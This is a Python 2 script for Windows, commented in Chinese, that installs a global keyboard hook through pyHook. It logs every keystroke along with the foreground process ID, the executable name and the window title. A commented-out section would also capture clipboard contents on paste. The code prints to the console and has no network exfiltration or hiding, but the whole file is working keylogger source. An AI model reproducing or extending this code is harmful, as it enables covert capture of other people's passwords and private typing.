#!/usr/bin/env python
#_*_ encoding:gbk _*_
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import win32api
import win32con

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

#
def get_current_process():
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()

    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 将进程ID存入变量中
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # 读取窗口标题
    windows_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)

    # 打印
    print
    print "[ PID:%s-%s-%s]" % (process_id, executable.value, windows_title.value)
    print

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

# 定义击键监听事件函数
def KeyStroke(event):
    global current_window

    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 函数调用
        get_current_process()

        # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii < 127:
        # print chr(event.Ascii),
        print event.Ascii
        if event.Ascii == 97:
            # win32api.keybd_event(37, 0, 0, 0)
            pass
        if event.Ascii == 115:
            # win32api.keybd_event(37, 0, 0, 0)
            pass
        '''
        q 113 w 119 e 101 r 114 t 116 y 121
        a 97 s 115 d 100 f 102 g 103 h 104
        '''
    else:
        print event.Key
    # else:
    #     # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
    #     if event.Key == "V":
    #         win32clipboard.OpenClipboard()
    #         pasted_value = win32clipboard.GetClipboardData()
    #         win32clipboard.CloseClipboard()
    #         print "[PASTE]-%s" % (pasted_value),
    #     else:
    #         print "[%s]" % event.Key,
    #         # 循环监听下一个击键事件
    return True

# 创建并注册hook管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# 注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()
